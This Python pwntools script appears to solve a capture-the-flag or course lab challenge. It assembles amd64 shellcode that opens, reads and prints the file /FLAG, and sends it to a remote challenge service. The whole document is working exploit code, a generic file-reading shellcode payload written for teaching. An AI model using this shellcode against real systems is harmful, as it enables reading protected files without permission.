from pwn import *
import os 

context.arch = 'amd64'
context.os = 'linux'

HOST, PORT = "up.zoolab.org", 12341

io = remote(HOST, PORT)


shellcode = asm(f"""
    /* Part 1: open("/FLAG", O_RDONLY) */
    /* Prepare arguments for open syscall */
    
    /* Method 1: RIP-relative addressing for the string (Recommended) */
    lea rdi, [rip+flag_path_label] 
    xor rsi, rsi                   
    xor rdx, rdx                   
    mov rax, SYS_open              
    syscall                        
    
    /* rax now holds the file descriptor (fd) */

    /* Part 2: read(fd, buffer, count) */
    mov rdi, rax                   
    
    /* Allocate buffer on the stack. */
    sub rsp, 0x80                  
    mov rsi, rsp                   
    
    mov rdx, 0x7f                  
    mov rax, SYS_read              
    syscall                        
    
    /* rax now holds the number of bytes read */

    /* Part 3: write(STDOUT_FILENO, buffer, bytes_read) */
    mov rdx, rax                   
    mov rdi, 1                     
                                   
    mov rax, SYS_write             
    syscall                        

    /* Restore stack pointer */
    add rsp, 0x80

    /* Part 4: exit(0) */
    mov rax, SYS_exit              
    xor rdi, rdi                   
    syscall

/* Data section for the string */
flag_path_label:
    .asciz "/FLAG"
""")

shellcode_len = len(shellcode)
print(f"[*] Shellcode length: {shellcode_len} bytes")
if shellcode_len > 100:
    print(f"[!] Error: Shellcode is too long ({shellcode_len} bytes), max is 100.")
    io.close()
    exit(1)

try:
    prompt = io.recvuntil(b"> ", timeout=1)
    print(f"[*] Received prompt: {prompt.decode().strip()}")
except EOFError:
    print("[!] Connection closed before receiving prompt.")
    io.close()
    exit(1)
except Exception as e: # 捕捉 PwnlibException 以外的超時錯誤
    print(f"[!] Timeout or error receiving prompt: {e}")
    io.close()
    exit(1)


print(f"[*] Sending shellcode ({shellcode_len} bytes)...")
io.send(shellcode)

try:
    # 伺服器可能會先印出 "** seccomp configured.\n"
    # 嘗試接收這行，如果它存在的話
    try:
        server_msg = io.recvline(timeout=0.1) # 短暫超時嘗試讀取
        if b"seccomp configured" in server_msg:
            print(f"[*] Server message: {server_msg.decode().strip()}")
        else:
            # 如果不是 seccomp 訊息，可能已經是 flag 的一部分了
            # 這種情況下，我們需要將它與後續的 recvall 合併
            # 為了簡單起見，如果不是預期的 seccomp 訊息，我們就假設 flag 開始了
            # 實際上更穩健的做法是檢查 server_msg 是否有內容，然後再 recvall
            # 但這裡我們假設如果不是 seccomp 訊息，就直接 recvall
            # 或者，如果 server_msg 有內容但不是 seccomp，則先印出，然後 recvall
            if server_msg.strip(): # 如果讀到了東西但不是 seccomp
                 print(f"[*] Received (possibly part of flag): {server_msg.decode(errors='ignore').strip()}")

    except Exception: # 捕獲超時等錯誤，說明 seccomp 訊息可能沒那麼快出現或不存在
        pass 


    flag_content = io.recvall(timeout=3)
    print("[+] Flag received:")
    print(flag_content.decode(errors='ignore').strip())

except EOFError:
    print("[!] Connection closed by server.")
except Exception as e:
    print(f"[!] An error occurred while receiving: {e}")
finally:
    io.close()